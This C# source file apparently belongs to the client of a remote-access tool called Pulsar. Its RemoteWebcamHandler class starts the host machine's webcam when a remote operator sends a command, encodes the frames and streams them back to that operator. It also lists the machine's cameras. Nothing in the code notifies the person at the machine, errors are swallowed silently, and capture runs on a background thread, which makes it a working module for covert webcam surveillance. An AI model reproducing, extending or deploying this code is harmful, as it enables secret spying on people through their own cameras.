using Pulsar.Client.Helper;
using Pulsar.Common.Enums;
using Pulsar.Common.Networking;
using Pulsar.Common.Video;
using Pulsar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Pulsar.Common.Messages.Webcam;
using Pulsar.Common.Messages.Other;
using System.Collections.Concurrent;

namespace Pulsar.Client.Messages
{
    public class RemoteWebcamHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _bmpData;
        private Bitmap _frameBmp;
        private ISender _clientMain;

        private Thread _captureThread;
        private WebcamHelper _helper;
        private CancellationTokenSource _cts;

        // Buffering
        private readonly ConcurrentQueue<byte[]> _buffer = new ConcurrentQueue<byte[]>();
        private readonly AutoResetEvent _wake = new AutoResetEvent(false);
        private int _pending = 0;
        private const int MAX_BUFFER = 10;

        // Stats
        private readonly Stopwatch _fpsWatch = new Stopwatch();
        private int _frameCounter;
        private float _lastFPS;
        private bool _sendFPS;

        private MemoryStream _stream;

        private WebcamHelper Helper
        {
            get { return _helper ?? (_helper = new WebcamHelper()); }
        }

        private MemoryStream Stream
        {
            get { return _stream ?? (_stream = new MemoryStream()); }
        }

        public override bool CanExecute(IMessage message)
        {
            return message is GetWebcam || message is GetAvailableWebcams;
        }

        public override bool CanExecuteFrom(ISender sender) { return true; }

        public override void Execute(ISender sender, IMessage msg)
        {
            if (msg is GetWebcam)
                Execute(sender, (GetWebcam)msg);
            else if (msg is GetAvailableWebcams)
                Execute(sender, (GetAvailableWebcams)msg);
        }

        private void Execute(ISender sender, GetWebcam m)
        {
            if (m.Status == RemoteWebcamStatus.Stop)
            {
                Stop();
                return;
            }

            if (m.Status == RemoteWebcamStatus.Start)
            {
                Start(sender, m);
                return;
            }

            if (m.Status == RemoteWebcamStatus.Continue)
            {
                Interlocked.Add(ref _pending, m.FramesRequested);
                _wake.Set();
            }
        }

        private void Start(ISender sender, GetWebcam msg)
        {
            try
            {
                try
                {
                    Helper.StartWebcam(msg.DisplayIndex);
                }
                catch (Exception ex)
                {
                    OnReport("Could not start webcam: " + ex.Message);
                    return;
                }

                var b = Helper.GetBounds();
                var res = new Resolution { Width = b.Width, Height = b.Height };

                try
                {
                    if (_streamCodec == null ||
                        msg.CreateNew ||
                        _streamCodec.ImageQuality != msg.Quality ||
                        _streamCodec.Monitor != msg.DisplayIndex ||
                        !_streamCodec.Resolution.Equals(res))
                    {
                        if (_streamCodec != null) _streamCodec.Dispose();
                        _streamCodec = new UnsafeStreamCodec(msg.Quality, msg.DisplayIndex, res);
                    }
                }
                catch (Exception ex)
                {
                    OnReport("Codec init failed: " + ex.Message);
                    return;
                }

                _clientMain = sender;

                Clear();
                Interlocked.Exchange(ref _pending, msg.FramesRequested);

                if (_captureThread == null || !_captureThread.IsAlive)
                {
                    _cts = new CancellationTokenSource();
                    _captureThread = new Thread(() => CaptureLoop(_cts.Token));
                    _captureThread.IsBackground = true;
                    _captureThread.Start();
                }
            }
            catch (Exception ex)
            {
                OnReport("Unexpected webcam start error: " + ex.Message);
            }
        }

        private void Stop()
        {
            try
            {
                try { Helper.StopWebcam(); } catch { }

                if (_cts != null)
                {
                    _cts.Cancel();
                    _wake.Set();
                }

                if (_captureThread != null && _captureThread.IsAlive)
                {
                    try { _captureThread.Join(); }
                    catch { }
                }

                _captureThread = null;

                if (_frameBmp != null)
                {
                    try
                    {
                        if (_bmpData != null)
                        {
                            _frameBmp.UnlockBits(_bmpData);
                            _bmpData = null;
                        }
                        _frameBmp.Dispose();
                    }
                    catch { }
                    _frameBmp = null;
                }

                if (_streamCodec != null)
                {
                    try { _streamCodec.Dispose(); } catch { }
                    _streamCodec = null;
                }

                Clear();
                Interlocked.Exchange(ref _pending, 0);
            }
            catch { }
        }

        private void CaptureLoop(CancellationToken ct)
        {
            _fpsWatch.Restart();
            _frameCounter = 0;

            while (!ct.IsCancellationRequested)
            {
                try
                {
                    if (_buffer.Count >= MAX_BUFFER || _pending <= 0)
                    {
                        _wake.WaitOne(400);
                        if (ct.IsCancellationRequested) break;
                        continue;
                    }

                    var data = Capture();
                    if (data != null)
                    {
                        _buffer.Enqueue(data);

                        _frameCounter++;
                        if (_fpsWatch.ElapsedMilliseconds >= 1000)
                        {
                            _lastFPS = _frameCounter;
                            _frameCounter = 0;
                            _fpsWatch.Restart();
                            _sendFPS = true;
                        }
                    }

                    while (_pending > 0 && _buffer.TryDequeue(out byte[] send))
                    {
                        Send(send, Interlocked.Decrement(ref _pending) == 0);
                    }
                }
                catch
                {
                    Thread.Sleep(50);
                }
            }
        }

        private byte[] Capture()
        {
            try
            {
                _frameBmp = Helper.GetLatestFrame();
                if (_frameBmp == null) return null;

                const PixelFormat pf = PixelFormat.Format32bppArgb;
                Bitmap b = _frameBmp;

                if (_frameBmp.PixelFormat != pf)
                {
                    Bitmap conv = new Bitmap(_frameBmp.Width, _frameBmp.Height, pf);
                    using (Graphics g = Graphics.FromImage(conv))
                        g.DrawImage(_frameBmp, 0, 0);

                    _frameBmp.Dispose();
                    _frameBmp = conv;
                    b = conv;
                }

                _bmpData = b.LockBits(new Rectangle(0, 0, b.Width, b.Height),
                    ImageLockMode.ReadOnly, b.PixelFormat);

                Stream.Position = 0;
                Stream.SetLength(0);

                _streamCodec.CodeImage(_bmpData.Scan0,
                    new Rectangle(0, 0, b.Width, b.Height),
                    new Size(b.Width, b.Height),
                    b.PixelFormat,
                    Stream);

                return Stream.ToArray();
            }
            catch
            {
                return null;
            }
            finally
            {
                if (_bmpData != null)
                {
                    try { _frameBmp.UnlockBits(_bmpData); } catch { }
                    _bmpData = null;
                }

                if (_frameBmp != null)
                {
                    try { _frameBmp.Dispose(); } catch { }
                    _frameBmp = null;
                }
            }
        }

        private void Send(byte[] data, bool last)
        {
            if (_clientMain == null || data == null) return;

            try
            {
                GetWebcamResponse r = new GetWebcamResponse();
                r.Image = data;
                r.Monitor = _streamCodec.Monitor;
                r.Resolution = _streamCodec.Resolution;
                r.Quality = _streamCodec.ImageQuality;
                r.IsLastRequestedFrame = last;
                r.FrameRate = _sendFPS ? _lastFPS : 0f;

                _sendFPS = false;
                _clientMain.Send(r);
            }
            catch { }
        }

        private void Clear()
        {
            byte[] tmp;
            while (_buffer.TryDequeue(out tmp)) { }
        }

        private void Execute(ISender sender, GetAvailableWebcams msg)
        {
            sender.Send(new GetAvailableWebcamsResponse
            {
                Webcams = WebcamHelper.GetWebcams()
            });
        }


        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool d)
        {
            if (d)
            {
                Stop();
                if (_cts != null) _cts.Dispose();
                if (_wake != null) _wake.Dispose();
                if (_stream != null) _stream.Dispose();
            }
        }
    }
}
